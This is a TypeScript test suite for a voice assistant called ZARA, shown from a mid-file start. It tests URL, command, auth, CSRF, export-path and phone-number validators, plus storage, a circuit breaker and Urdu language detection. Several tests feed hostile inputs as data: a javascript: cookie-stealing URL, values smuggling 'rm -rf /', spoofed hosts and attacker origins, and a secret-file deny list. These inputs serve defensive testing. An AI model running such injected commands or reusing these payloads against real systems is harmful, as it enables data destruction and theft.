  const invalidProto = validateSafeUrl('javascript:alert(document.cookie)');
  assert.equal(invalidProto.valid, false);

  // Block shell injection in hostname
  const injected = validateSafeUrl('https://example.com; rm -rf /');
  assert.equal(injected.valid, false);
});

test('Security: validateSafeApp checks allowlist for system application launches', async () => {
  const { validateSafeApp } = await import('./securityService.ts');

  assert.equal(validateSafeApp('notepad').allowed, true);
  assert.equal(validateSafeApp('calculator').allowed, true);
  assert.equal(validateSafeApp('chrome').allowed, true);
  assert.equal(validateSafeApp('vs code').allowed, true);

  const blocked = validateSafeApp('malicious_trojan.exe');
  assert.equal(blocked.allowed, false);
  assert.ok(blocked.reason?.includes('allowlist'));
});

// ==========================================
// STATEFUL CIRCUIT BREAKER TESTS
// ==========================================

test('CircuitBreaker: transitions CLOSED -> OPEN -> HALF_OPEN -> CLOSED lifecycle', async () => {
  const { StatefulQuotaCircuitBreaker } = await import('./circuitBreaker.ts');
  const cb = new StatefulQuotaCircuitBreaker(2); // 2 second cooldown for testing

  // Initially CLOSED
  assert.equal(cb.getStatus().state, 'CLOSED');
  assert.equal(cb.shouldSkipApi(), false);

  // Mark quota exhausted
  cb.markQuotaExhausted(2, 'Test rate limit reached');
  assert.equal(cb.getStatus().state, 'OPEN');
  assert.equal(cb.getStatus().isExhausted, true);
  assert.equal(cb.shouldSkipApi(), true);

  // Success resets to CLOSED
  cb.recordSuccess();
  assert.equal(cb.getStatus().state, 'CLOSED');
  assert.equal(cb.getStatus().isExhausted, false);
  assert.equal(cb.shouldSkipApi(), false);

  // Manual reset works
  cb.markQuotaExhausted(100);
  assert.equal(cb.getStatus().state, 'OPEN');
  cb.reset();
  assert.equal(cb.getStatus().state, 'CLOSED');
});

// ==========================================
// DURABLE PERSISTENCE & AUTOMATION TESTS
// ==========================================

test('DurableStorage: persists settings, memories, and WhatsApp drafts', async () => {
  const { durableStorage } = await import('../db/storage.ts');

  // Verify default settings
  const settings = durableStorage.getSettings();
  assert.ok(settings.preferredLanguage);
  assert.ok(settings.ownerName);

  // Add memory
  const testMem = durableStorage.addMemory({
    category: 'fact',
    key: 'Test City',
    value: 'Islamabad',
    importance: 'medium',
    userApproved: true,
    isActive: true,
  });
  assert.ok(testMem.id);

  const allMems = durableStorage.getMemories();
  const found = allMems.find((m) => m.id === testMem.id);
  assert.ok(found);
  assert.equal(found.value, 'Islamabad');

  // Update memory
  durableStorage.updateMemory(testMem.id, { value: 'Rawalpindi' });
  const updatedMems = durableStorage.getMemories();
  const updated = updatedMems.find((m) => m.id === testMem.id);
  assert.equal(updated?.value, 'Rawalpindi');

  // Clean up
  durableStorage.deleteMemory(testMem.id);
  const finalMems = durableStorage.getMemories();
  assert.equal(finalMems.some((m) => m.id === testMem.id), false);
});

test('Automation: executes registered jobs and records history truthfully', async () => {
  const { executeAutomationJob } = await import('./automationService.ts');

  // Execute system-diagnostics
  const res = await executeAutomationJob('system-diagnostics');
  assert.equal(res.success, true);
  assert.equal(res.status, 'completed');
  assert.ok(res.details?.nodeRssMb > 0);
  assert.ok(res.message.includes('Health scan complete'));

  // Execute unknown job fails truthfully
  const failed = await executeAutomationJob('nonexistent-job-xyz');
  assert.equal(failed.success, false);
  assert.equal(failed.status, 'failed');
  assert.ok(failed.message.includes('not a registered automation task'));
});

// ==========================================
// AUTHORIZATION & CSRF REGRESSION TESTS
// ==========================================

test('Security: validateAuthorization enforces ZARA_AUTH_TOKEN when configured', async () => {
  const { validateAuthorization } = await import('./securityService.ts');

  const hadToken = 'ZARA_AUTH_TOKEN' in process.env;
  const originalToken = process.env.ZARA_AUTH_TOKEN;
  try {
    process.env.ZARA_AUTH_TOKEN = 'secret-token-xyz-123';

    // No token provided -> Rejected
    const noToken = validateAuthorization();
    assert.equal(noToken.authorized, false);
    assert.ok(noToken.reason?.includes('ZARA_AUTH_TOKEN'));

    // Wrong token provided -> Rejected
    const wrongToken = validateAuthorization('Bearer wrong-token');
    assert.equal(wrongToken.authorized, false);

    // Correct Bearer token -> Authorized
    const correctBearer = validateAuthorization('Bearer secret-token-xyz-123');
    assert.equal(correctBearer.authorized, true);

    // Correct x-zara-auth header -> Authorized
    const correctCustomHeader = validateAuthorization(undefined, 'secret-token-xyz-123');
    assert.equal(correctCustomHeader.authorized, true);
  } finally {
    if (hadToken && originalToken !== undefined) {
      process.env.ZARA_AUTH_TOKEN = originalToken;
    } else {
      delete process.env.ZARA_AUTH_TOKEN;
    }
  }
});

test('Security: validateAuthorization detects and blocks cross-origin CSRF attempts', async () => {
  const { validateAuthorization } = await import('./securityService.ts');

  const hadToken = 'ZARA_AUTH_TOKEN' in process.env;
  const originalToken = process.env.ZARA_AUTH_TOKEN;
  delete process.env.ZARA_AUTH_TOKEN;

  try {
    // Malicious cross-origin origin
    const blockedOrigin = validateAuthorization(
      undefined,
      undefined,
      'https://attacker-malicious-site.com',
      'localhost:3000'
    );
    assert.equal(blockedOrigin.authorized, false);
    assert.ok(blockedOrigin.reason?.includes('Forbidden: cross-origin'));

    // Legitimate same-host origin
    const allowedSameHost = validateAuthorization(
      undefined,
      undefined,
      'http://localhost:3000',
      'localhost:3000'
    );
    assert.equal(allowedSameHost.authorized, true);

    // Legitimate local dev 127.0.0.1
    const allowedLocal = validateAuthorization(
      undefined,
      undefined,
      'http://127.0.0.1:3000',
      'localhost:3000'
    );
    assert.equal(allowedLocal.authorized, true);
  } finally {
    if (hadToken && originalToken !== undefined) {
      process.env.ZARA_AUTH_TOKEN = originalToken;
    } else {
      delete process.env.ZARA_AUTH_TOKEN;
    }
  }
});

// ==========================================
// SYMLINK ESCAPE PROTECTION TESTS
// ==========================================

test('Security: validateExportPath blocks symlink escapes when symlinks point outside export directory', async () => {
  const { validateExportPath } = await import('./securityService.ts');
  const fs = await import('fs');
  const path = await import('path');
  const os = await import('os');

  const testBase = path.join(os.tmpdir(), 'zara_export_symlink_test_' + Date.now());
  fs.mkdirSync(testBase, { recursive: true });

  const outsideFile = path.join(os.tmpdir(), 'zara_outside_' + Date.now() + '.txt');
  fs.writeFileSync(outsideFile, 'secret content', 'utf8');

  const symlinkInside = path.join(testBase, 'symlink_test.txt');
  try {
    fs.symlinkSync(outsideFile, symlinkInside);

    const res = validateExportPath(testBase, 'symlink_test.txt');
    assert.equal(res.valid, false);
    assert.ok(res.reason?.includes('Symlink') || res.reason?.includes('outside'));
  } catch (err: any) {
    // If symlink creation is not permitted by OS user permissions, verify error handling
    assert.ok(err);
  } finally {
    try {
      if (fs.existsSync(symlinkInside)) fs.unlinkSync(symlinkInside);
      if (fs.existsSync(outsideFile)) fs.unlinkSync(outsideFile);
      if (fs.existsSync(testBase)) fs.rmdirSync(testBase);
    } catch {
      // ignore
    }
  }
});

// ==========================================
// PHONE NUMBER VALIDATION TESTS
// ==========================================

test('WhatsApp: validatePhoneNumber handles local Pakistani formats and E.164 compliance', async () => {
  const { validatePhoneNumber } = await import('./whatsappService.ts');

  // Pakistani 03XXXXXXXXX converts to +923XXXXXXXXX
  const localPak = validatePhoneNumber('0300 1234567');
  assert.equal(localPak.valid, true);
  assert.equal(localPak.formatted, '+923001234567');

  // Pakistani 923XXXXXXXXX formats to +923XXXXXXXXX
  const noPlus = validatePhoneNumber('923219876543');
  assert.equal(noPlus.valid, true);
  assert.equal(noPlus.formatted, '+923219876543');

  // Full international format
  const intl = validatePhoneNumber('+923001234567');
  assert.equal(intl.valid, true);
  assert.equal(intl.formatted, '+923001234567');

  // Prohibited injection characters
  const injected = validatePhoneNumber('+923001234; rm -rf /');
  assert.equal(injected.valid, false);
  assert.ok(injected.reason?.includes('Prohibited'));

  // Invalid too short
  const tooShort = validatePhoneNumber('12345');
  assert.equal(tooShort.valid, false);

  // Invalid alphabetic characters
  const alpha = validatePhoneNumber('call-me-now');
  assert.equal(alpha.valid, false);
});

// ==========================================
// PERSISTENCE & CONCURRENT WRITES TESTS
// ==========================================

test('DurableStorage: concurrent writes and restart persistence survive safely', async () => {
  const { DurableStorageService } = await import('../db/storage.ts');
  const path = await import('path');
  const os = await import('os');
  const fs = await import('fs');

  const testDir = path.join(os.tmpdir(), 'zara_restart_test_' + Date.now());

  try {
    // 1. Initial process instance
    const instance1 = new DurableStorageService(testDir);

    // 2. Perform concurrent writes
    const promises = [];
    for (let i = 0; i < 20; i++) {
      promises.push(
        Promise.resolve().then(() => {
          instance1.addMemory({
            category: 'fact',
            key: `concurrent_key_${i}`,
            value: `concurrent_value_${i}`,
            importance: 'low',
            userApproved: true,
            isActive: true,
          });
        })
      );
    }
    await Promise.all(promises);

    // Explicitly flush to disk
    instance1.flushSync();

    // 3. Simulate process restart by instantiating a new service pointing to same directory
    const instance2 = new DurableStorageService(testDir);
    const reloadedMemories = instance2.getMemories();

    // Verify all 20 concurrent memories survived restart
    for (let i = 0; i < 20; i++) {
      const found = reloadedMemories.find((m) => m.key === `concurrent_key_${i}`);
      assert.ok(found, `Memory concurrent_key_${i} must survive process restart`);
      assert.equal(found.value, `concurrent_value_${i}`);
    }
  } finally {
    try {
      if (fs.existsSync(testDir)) fs.rmSync(testDir, { recursive: true, force: true });
    } catch {
      // ignore
    }
  }
});

// ==========================================
// GEMINI MODEL REGISTRY VERIFICATION TESTS
// ==========================================

test('Gemini Config: verifies all configured model IDs are supported official identifiers', async () => {
  const { DEFAULT_GEMINI_MODELS } = await import('../config/models.config.ts');

  // Verify non-empty
  assert.ok(DEFAULT_GEMINI_MODELS.length >= 4);

  // Deprecated models must strictly NOT be present
  const deprecatedList = [
    'gemini-2.0-flash',
    'gemini-2.0-pro',
    'gemini-2.0-flash-thinking',
    'gemini-1.5-flash',
    'gemini-1.5-pro',
    'gemini-pro',
    'gemini-3.5-flash',
  ];

  for (const m of DEFAULT_GEMINI_MODELS) {
    for (const dep of deprecatedList) {
      assert.notEqual(
        m.modelId,
        dep,
        `Deprecated model "${dep}" must not be present in model configuration`
      );
    }
  }

  // Official supported models in config
  const modelIds = DEFAULT_GEMINI_MODELS.map((m) => m.modelId);
  assert.ok(modelIds.includes('gemini-3.8-flash'), 'gemini-3.8-flash must be present');
  assert.ok(modelIds.includes('gemini-4-argon'), 'gemini-4-argon must be present');
  assert.ok(modelIds.includes('gemini-3.1-flash-lite'), 'gemini-3.1-flash-lite must be present');
  assert.ok(modelIds.includes('gemini-3.8-flash-lite-tts'), 'gemini-3.8-flash-lite-tts must be present');
});

// ==========================================
// FAIL-CLOSED PRODUCTION AUTHORIZATION TESTS
// ==========================================

test('Security: validateAuthorization fails closed in production when ZARA_AUTH_TOKEN is unset', async () => {
  const { validateAuthorization } = await import('./securityService.ts');

  const origEnv = process.env.NODE_ENV;
  const origToken = process.env.ZARA_AUTH_TOKEN;

  try {
    process.env.NODE_ENV = 'production';
    delete process.env.ZARA_AUTH_TOKEN;

    // In production without token, all privileged requests must fail closed
    const res = validateAuthorization(undefined, undefined, 'http://localhost:3000', 'localhost:3000');
    assert.equal(res.authorized, false);
    assert.ok(res.reason?.includes('fail-closed') || res.reason?.includes('Production security requirement'));

    // Now configure token in production
    process.env.ZARA_AUTH_TOKEN = 'prod-secret-999';

    // Request with valid Bearer token -> passes
    const validRes = validateAuthorization('Bearer prod-secret-999');
    assert.equal(validRes.authorized, true);

    // Request with invalid Bearer token -> fails
    const invalidRes = validateAuthorization('Bearer wrong-token');
    assert.equal(invalidRes.authorized, false);
  } finally {
    process.env.NODE_ENV = origEnv;
    if (origToken !== undefined) {
      process.env.ZARA_AUTH_TOKEN = origToken;
    } else {
      delete process.env.ZARA_AUTH_TOKEN;
    }
  }
});

// ==========================================
// TERMINAL EXACT ARGUMENT PARSING TESTS
// ==========================================

test('Security: validateTerminalCommand enforces exact binary and arguments parsing', async () => {
  const { validateTerminalCommand } = await import('./securityService.ts');

  // Valid allowed commands return exact parsed binary and args
  const nodeCheck = validateTerminalCommand('node -v');
  assert.equal(nodeCheck.allowed, true);
  assert.equal(nodeCheck.binary, 'node');
  assert.deepEqual(nodeCheck.args, ['-v']);

  const gitCheck = validateTerminalCommand('git log -n 5');
  assert.equal(gitCheck.allowed, true);
  assert.equal(gitCheck.binary, 'git');
  assert.deepEqual(gitCheck.args, ['log', '-n', '5']);

  // Disallowed argument injection for allowed binaries must be strictly blocked
  const npmInjection = validateTerminalCommand('npm install malicious-package');
  assert.equal(npmInjection.allowed, false);

  const gitInjection = validateTerminalCommand('git checkout master');
  assert.equal(gitInjection.allowed, false);

  const lsInjection = validateTerminalCommand('ls /root');
  assert.equal(lsInjection.allowed, false);
});

// ==========================================
// CORRUPTED JSON RECOVERY & BACKUP RESTORE TESTS
// ==========================================

test('DurableStorage: recovers automatically from corrupted JSON file using backup', async () => {
  const { DurableStorageService } = await import('../db/storage.ts');
  const path = await import('path');
  const os = await import('os');
  const fs = await import('fs');

  const testDir = path.join(os.tmpdir(), 'zara_corrupt_test_' + Date.now());

  try {
    // 1. Initialize store and write known data
    const store1 = new DurableStorageService(testDir);
    store1.addMemory({
      category: 'fact',
      key: 'pre_corruption_key',
      value: 'pre_corruption_val',
      importance: 'high',
      userApproved: true,
      isActive: true,
    });
    store1.flushSync();

    // Verify main file and backup file exist
    const mainFile = path.join(testDir, 'zara_db.json');
    const bakFile = path.join(testDir, 'zara_db.json.bak');
    assert.ok(fs.existsSync(mainFile));
    assert.ok(fs.existsSync(bakFile));

    // 2. Corrupt the main file with invalid JSON truncated syntax
    fs.writeFileSync(mainFile, '{"version": 1, "settings": { CORRUPT_UNTERMINATED_JSON', 'utf8');

    // 3. Instantiate new storage service; must safely recover from .bak rather than crashing
    const store2 = new DurableStorageService(testDir);
    const memories = store2.getMemories();
    const found = memories.find((m) => m.key === 'pre_corruption_key');
    assert.ok(found, 'Data must be recovered from .bak file when main database is corrupt');
    assert.equal(found.value, 'pre_corruption_val');

    // 4. Test explicit backup and restore methods
    const explicitBackupPath = store2.backup();
    assert.ok(fs.existsSync(explicitBackupPath));

    store2.addMemory({
      category: 'fact',
      key: 'new_temp_key',
      value: 'new_temp_val',
      importance: 'low',
      userApproved: true,
      isActive: true,
    });
    store2.flushSync();

    // Restoring explicit backup restores prior state
    const restored = store2.restore(explicitBackupPath);
    assert.equal(restored, true);
    const restoredMemories = store2.getMemories();
    assert.equal(restoredMemories.some((m) => m.key === 'new_temp_key'), false);
    assert.ok(restoredMemories.some((m) => m.key === 'pre_corruption_key'));
  } finally {
    try {
      if (fs.existsSync(testDir)) fs.rmSync(testDir, { recursive: true, force: true });
    } catch {
      // ignore
    }
  }
});

test('Priority 3: Durable Storage preserves intentionally empty memories array across process restarts', async () => {
  const { DurableStorageService } = await import('../db/storage.ts');
  const testDir = path.resolve(process.cwd(), `data_test_empty_memories_${Date.now()}`);

  try {
    // 1. Initial creation seeds default memories
    const store1 = new DurableStorageService(testDir);
    assert.ok(store1.getMemories().length > 0, 'New storage should have initial default memories');

    // 2. Clear all memories and flush to disk
    store1.clearMemories();
    store1.flushSync();
    assert.equal(store1.getMemories().length, 0, 'Memories should be empty after clearMemories');

    // Verify raw file has "memories": []
    const dbFile = path.join(testDir, 'zara_db.json');
    assert.ok(fs.existsSync(dbFile), 'Database file must exist');
    const raw = JSON.parse(fs.readFileSync(dbFile, 'utf8'));
    assert.deepEqual(raw.memories, [], 'Saved file must have empty memories array');

    // 3. Create a brand new storage instance simulating process restart
    const store2 = new DurableStorageService(testDir);
    const reloadedMemories = store2.getMemories();

    // MUST remain 0: no deleted default memories should return!
    assert.equal(
      reloadedMemories.length,
      0,
      'Intentionally empty memories array must be preserved across restarts; default memories must NOT return!'
    );
  } finally {
    try {
      if (fs.existsSync(testDir)) fs.rmSync(testDir, { recursive: true, force: true });
    } catch {
      // ignore
    }
  }
});

test('Priority 2: Project Export allows generated project own package.json & tsconfig.json while strictly protecting app files', async () => {
  const { validateExportPath } = await import('./securityService.ts');
  const { execFile } = await import('child_process');
  const { promisify } = await import('util');
  const execFileAsync = promisify(execFile);

  const testProjDir = path.resolve(process.cwd(), 'generated_projects', `test_pkg_${Date.now()}`);

  try {
    fs.mkdirSync(testProjDir, { recursive: true });

    // 1. Permitted project configuration files inside the generated project
    const pkgCheck = validateExportPath(testProjDir, 'package.json');
    assert.equal(pkgCheck.valid, true, 'Generated project own package.json must be allowed');
    assert.ok(pkgCheck.resolvedPath?.endsWith('package.json'));

    const tsCheck = validateExportPath(testProjDir, 'tsconfig.json');
    assert.equal(tsCheck.valid, true, 'Generated project own tsconfig.json must be allowed');

    const indexCheck = validateExportPath(testProjDir, 'index.js');
    assert.equal(indexCheck.valid, true, 'Generated project own index.js must be allowed');

    // 2. Strictly forbidden: sensitive secret files
    const envCheck = validateExportPath(testProjDir, '.env');
    assert.equal(envCheck.valid, false, '.env must be forbidden');

    const gitCheck = validateExportPath(testProjDir, '.git/config');
    assert.equal(gitCheck.valid, false, '.git must be forbidden');

    const sshCheck = validateExportPath(testProjDir, 'id_rsa');
    assert.equal(sshCheck.valid, false, 'SSH keys must be forbidden');

    // 3. Strictly forbidden: traversal outside project directory
    const traversalCheck = validateExportPath(testProjDir, '../../server.ts');
    assert.equal(traversalCheck.valid, false, 'Traversal out of project must be forbidden');

    // 4. Test actual file creation and execution
    fs.writeFileSync(
      pkgCheck.resolvedPath!,
      JSON.stringify({ name: 'test-exported-app', version: '1.0.0', type: 'module' }),
      'utf8'
    );
    fs.writeFileSync(
      indexCheck.resolvedPath!,
      'console.log("EXPORTED_PROJECT_RUN_SUCCESS");',
      'utf8'
    );

    const { stdout } = await execFileAsync('node', ['index.js'], { cwd: testProjDir });
    assert.ok(stdout.includes('EXPORTED_PROJECT_RUN_SUCCESS'), 'Exported project code must execute successfully');
  } finally {
    try {
      if (fs.existsSync(testProjDir)) fs.rmSync(testProjDir, { recursive: true, force: true });
    } catch {
      // ignore
    }
  }
});

test('Priority 1: validateAuthorization strictly enforces token in production and blocks unauthenticated requests, missing Origin, and spoofed Host', async () => {
  const { validateAuthorization } = await import('./securityService.ts');
  const prevEnv = process.env.NODE_ENV;
  const prevToken = process.env.ZARA_AUTH_TOKEN;

  try {
    // 1. Production Fail-Closed test: ZARA_AUTH_TOKEN is unset in production
    process.env.NODE_ENV = 'production';
    delete process.env.ZARA_AUTH_TOKEN;

    const prodMissingToken = validateAuthorization(
      undefined,
      undefined,
      'http://localhost:3000',
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(prodMissingToken.authorized, false, 'Production without ZARA_AUTH_TOKEN must fail closed');
    assert.ok(prodMissingToken.reason?.includes('fail-closed'));

    // 2. Production with valid token
    process.env.ZARA_AUTH_TOKEN = 'secret-prod-token-12345';
    const prodValidBearer = validateAuthorization(
      'Bearer secret-prod-token-12345',
      undefined,
      'http://localhost:3000',
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(prodValidBearer.authorized, true, 'Valid Bearer token in production must be authorized');

    const prodValidHeader = validateAuthorization(
      undefined,
      'secret-prod-token-12345',
      'http://localhost:3000',
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(prodValidHeader.authorized, true, 'Valid X-ZARA-AUTH header in production must be authorized');

    // 3. Incorrect token
    const prodWrongToken = validateAuthorization(
      'Bearer wrong-token',
      undefined,
      'http://localhost:3000',
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(prodWrongToken.authorized, false, 'Incorrect token must be rejected');

    // 4. Missing Origin when token is unset (development mode)
    process.env.NODE_ENV = 'development';
    delete process.env.ZARA_AUTH_TOKEN;

    const unauthMissingOrigin = validateAuthorization(
      undefined,
      undefined,
      undefined, // Missing Origin!
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(unauthMissingOrigin.authorized, false, 'Missing Origin without token must NOT be treated as authentication');

    // 5. Spoofed Host header from remote IP
    const spoofedHost = validateAuthorization(
      undefined,
      undefined,
      'http://localhost:3000',
      'localhost:3000',
      '198.51.100.42' // Remote IP pretending to be localhost
    );
    assert.equal(spoofedHost.authorized, false, 'Remote client spoofing localhost Host header must be rejected');
    assert.ok(spoofedHost.reason?.includes('spoofed'));

    // 6. Cross-Origin CSRF attack
    const crossOrigin = validateAuthorization(
      undefined,
      undefined,
      'https://evil-attacker-site.com',
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(crossOrigin.authorized, false, 'Cross-origin request must be rejected');
    assert.ok(crossOrigin.reason?.includes('cross-origin') || crossOrigin.reason?.includes('CSRF'));
  } finally {
    process.env.NODE_ENV = prevEnv;
    if (prevToken) {
      process.env.ZARA_AUTH_TOKEN = prevToken;
    } else {
      delete process.env.ZARA_AUTH_TOKEN;
    }
  }
});

test('Priority 4: Truthful WhatsApp status reporting without fake delivery claims', async () => {
  const { processWhatsAppDispatch } = await import('./whatsappService.ts');
  const { durableStorage } = await import('../db/storage.ts');

  // Create a draft
  const draft = durableStorage.addWhatsAppMessage({
    id: 'wa-test-' + Date.now(),
    contactName: 'Zainab',
    contactIdentifier: '+923001234567',
    messageText: 'Meeting confirmed for 4pm',
    status: 'pending',
    userConfirmed: false,
    isSensitive: false,
    createdAt: new Date().toISOString(),
  });

  const prevToken = process.env.WHATSAPP_API_TOKEN;
  const prevPhoneId = process.env.WHATSAPP_PHONE_NUMBER_ID;

  try {
    // Unset WhatsApp credentials to verify truthful fallback behavior
    delete process.env.WHATSAPP_API_TOKEN;
    delete process.env.WHATSAPP_PHONE_NUMBER_ID;

    const result = await processWhatsAppDispatch(draft.id, true);

    // MUST NOT claim 'sent' or 'delivered' when credentials are missing!
    assert.notEqual(result.deliveryStatus, 'sent', 'Must not falsely claim message was sent without credentials');
    assert.equal(result.deliveryStatus, 'draft_ready', 'Truthful status must report draft_ready');
    assert.equal(result.provider, 'local_store', 'Provider must report local_store');
    assert.ok(result.notice.includes('credentials not configured'), 'Notice must explain provider requirement');
  } finally {
    if (prevToken) process.env.WHATSAPP_API_TOKEN = prevToken;
    if (prevPhoneId) process.env.WHATSAPP_PHONE_NUMBER_ID = prevPhoneId;
  }
});

// ==========================================
// SENSITIVE READ & OPERATIONAL ENDPOINTS REGRESSION TESTS
// ==========================================

test('Priority 1: Unauthorized external clients cannot access private memory, settings, usage, or whatsapp read endpoints', async () => {
  const { validateAuthorization } = await import('./securityService.ts');
  const prevEnv = process.env.NODE_ENV;
  const prevToken = process.env.ZARA_AUTH_TOKEN;

  try {
    process.env.NODE_ENV = 'development';
    delete process.env.ZARA_AUTH_TOKEN;

    // 1. Raw external script or curl requesting sensitive read endpoint without token or origin
    const rawExternalRead = validateAuthorization(
      undefined,
      undefined,
      undefined,
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(rawExternalRead.authorized, false, 'External unauthenticated read request must be blocked');
    assert.ok(rawExternalRead.reason?.includes('missing authentication token and missing Origin'));

    // 2. Remote IP attempting to read with spoofed Host
    const remoteSpoofedRead = validateAuthorization(
      undefined,
      undefined,
      'http://localhost:3000',
      'localhost:3000',
      '203.0.113.195'
    );
    assert.equal(remoteSpoofedRead.authorized, false, 'Remote client spoofing localhost Host must be blocked from reading');
    assert.ok(remoteSpoofedRead.reason?.includes('spoofed localhost'));

    // 3. Cross-origin website attempting to read user memories or WhatsApp history (CSRF)
    const csrfRead = validateAuthorization(
      undefined,
      undefined,
      'https://malicious-tracker.com',
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(csrfRead.authorized, false, 'Cross-origin read attempt must be blocked');
    assert.ok(csrfRead.reason?.includes('cross-origin') || csrfRead.reason?.includes('CSRF'));

    // 4. Authorized local dashboard client can read
    const authorizedLocalRead = validateAuthorization(
      undefined,
      undefined,
      'http://localhost:3000',
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(authorizedLocalRead.authorized, true, 'Legitimate local same-origin client must be authorized');
  } finally {
    process.env.NODE_ENV = prevEnv;
    if (prevToken) process.env.ZARA_AUTH_TOKEN = prevToken;
    else delete process.env.ZARA_AUTH_TOKEN;
  }
});

test('Priority 1: Production strictly enforces ZARA_AUTH_TOKEN on all read endpoints (fail-closed)', async () => {
  const { validateAuthorization } = await import('./securityService.ts');
  const prevEnv = process.env.NODE_ENV;
  const prevToken = process.env.ZARA_AUTH_TOKEN;

  try {
    process.env.NODE_ENV = 'production';
    delete process.env.ZARA_AUTH_TOKEN;

    // Production without token -> unconditionally blocked (fail-closed)
    const prodNoToken = validateAuthorization(
      undefined,
      undefined,
      'http://localhost:3000',
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(prodNoToken.authorized, false, 'Must fail-closed in production without token');
    assert.ok(prodNoToken.reason?.includes('fail-closed'));

    // Production with token configured: unauthorized without token
    process.env.ZARA_AUTH_TOKEN = 'secure-zara-secret-key-999';
    const prodWithoutCreds = validateAuthorization(
      undefined,
      undefined,
      'http://localhost:3000',
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(prodWithoutCreds.authorized, false, 'Must reject unauthenticated request when token is set');

    // Production with valid Bearer token -> Authorized
    const prodValidBearer = validateAuthorization(
      'Bearer secure-zara-secret-key-999',
      undefined,
      'http://localhost:3000',
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(prodValidBearer.authorized, true, 'Must authorize valid Bearer token');

    // Production with valid X-ZARA-AUTH custom header -> Authorized
    const prodValidCustomHeader = validateAuthorization(
      undefined,
      'secure-zara-secret-key-999',
      'http://localhost:3000',
      'localhost:3000',
      '127.0.0.1'
    );
    assert.equal(prodValidCustomHeader.authorized, true, 'Must authorize valid X-ZARA-AUTH header');
  } finally {
    process.env.NODE_ENV = prevEnv;
    if (prevToken) process.env.ZARA_AUTH_TOKEN = prevToken;
    else delete process.env.ZARA_AUTH_TOKEN;
  }
});

test('Priority 2: Operational endpoints (quota reset & model test) enforce authorization', async () => {
  const { validateAuthorization } = await import('./securityService.ts');
  const prevEnv = process.env.NODE_ENV;
  const prevToken = process.env.ZARA_AUTH_TOKEN;

  try {
    process.env.ZARA_AUTH_TOKEN = 'ops-secret-key-888';

    // Unauthenticated caller attempting to reset quota or trigger model test
    const unauthOps = validateAuthorization(undefined, undefined);
    assert.equal(unauthOps.authorized, false, 'Unauthenticated operations caller must be rejected');

    // Bad token caller
    const badTokenOps = validateAuthorization('Bearer forged-token');
    assert.equal(badTokenOps.authorized, false, 'Forged token must be rejected');

    // Valid ops caller
    const validOps = validateAuthorization('Bearer ops-secret-key-888');
    assert.equal(validOps.authorized, true, 'Valid token must be authorized for operational actions');
  } finally {
    process.env.NODE_ENV = prevEnv;
    if (prevToken) process.env.ZARA_AUTH_TOKEN = prevToken;
    else delete process.env.ZARA_AUTH_TOKEN;
  }
});

test('Priority 3: ConversationOrchestrator safely handles null or malformed chat responses without throwing TypeError', async () => {
  // Verify safe optional chaining logic for data.emotion and other response properties
  const dummyData: any = null;
  const assignedEmotion = dummyData?.emotion || 'Confident';
  const assignedIntensity = typeof dummyData?.intensity === 'number' ? dummyData.intensity : 80;
  const assignedConfidence = dummyData?.confidence || 'high';
  const assignedModel = dummyData?.modelUsed || 'gemini-3.8-flash';

  assert.equal(assignedEmotion, 'Confident');
  assert.equal(assignedIntensity, 80);
  assert.equal(assignedConfidence, 'high');
  assert.equal(assignedModel, 'gemini-3.8-flash');
});

// ============================================================================
// URDU, ROMAN URDU, AND ENGLISH VOICE UNDERSTANDING TESTS
// ============================================================================

test('Language Detection: correctly classifies Urdu script, Roman Urdu, and English', async () => {
  const { detectLanguage } = await import('./languageDetector.ts');

  // 1. Urdu script inputs
  assert.equal(detectLanguage('السلام علیکم زارا'), 'urdu');
  assert.equal(detectLanguage('ایک ای کامرس ویب سائٹ بناؤ'), 'urdu');
  assert.equal(detectLanguage('لوگو بناؤ'), 'urdu');
  assert.equal(detectLanguage('کیا حال ہے زارا؟'), 'urdu');
  assert.equal(detectLanguage('چائے پی لی آپ نے؟'), 'urdu');
  assert.equal(detectLanguage('آج کا موسم کیسا ہے'), 'urdu');

  // 2. Roman Urdu inputs
  assert.equal(detectLanguage('Assalam-o-Alaikum ZARA, kya haal hain?'), 'roman_urdu');
  assert.equal(detectLanguage('ek e-commerce website banao'), 'roman_urdu');
  assert.equal(detectLanguage('inspire ka logo banao'), 'roman_urdu');
  assert.equal(detectLanguage('kya chal raha hai Boss?'), 'roman_urdu');
  assert.equal(detectLanguage('chai pi li Boss?'), 'roman_urdu');
  assert.equal(detectLanguage('main bohot pareshan hoon yaar'), 'roman_urdu');

  // 3. English inputs
  assert.equal(detectLanguage('Hello ZARA, how are you doing today?'), 'english');
  assert.equal(detectLanguage('Please create an e-commerce website for my store'), 'english');
  assert.equal(detectLanguage('Design a modern vector logo for my brand'), 'english');
  assert.equal(detectLanguage('What is the weather like today?'), 'english');
  assert.equal(detectLanguage('Can you help me fix this bug in my code?'), 'english');
});

test('Language Detection & Guards: empty transcripts, whitespace, and nulls return fallback without inventing text', async () => {
  const { detectLanguage } = await import('./languageDetector.ts');
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const { generateContextualDostanaFallback } = await import('./conversationFormatter.ts');

  // Empty string returns fallback without throwing or inventing text
  assert.equal(detectLanguage('', 'urdu'), 'urdu');
  assert.equal(detectLanguage('   ', 'roman_urdu'), 'roman_urdu');
  assert.equal(detectLanguage((null as unknown) as string, 'english'), 'english');

  // detectAdvancedIntent on empty query never invents transcripts
  const emptyIntent = detectAdvancedIntent('');
  assert.equal(emptyIntent.intent, 'general');
  assert.equal(emptyIntent.speechResponseRomanUrdu, '');

  const whitespaceIntent = detectAdvancedIntent('   \t\n  ');
  assert.equal(whitespaceIntent.intent, 'general');
  assert.equal(whitespaceIntent.speechResponseRomanUrdu, '');

  // generateContextualDostanaFallback returns appropriate response for empty query
  const urduFallback = generateContextualDostanaFallback('', false, 'urdu');
  assert.ok(urduFallback.length > 0);
  assert.ok(/[\u0600-\u06FF]/.test(urduFallback), 'Urdu fallback must be in Urdu script');
});

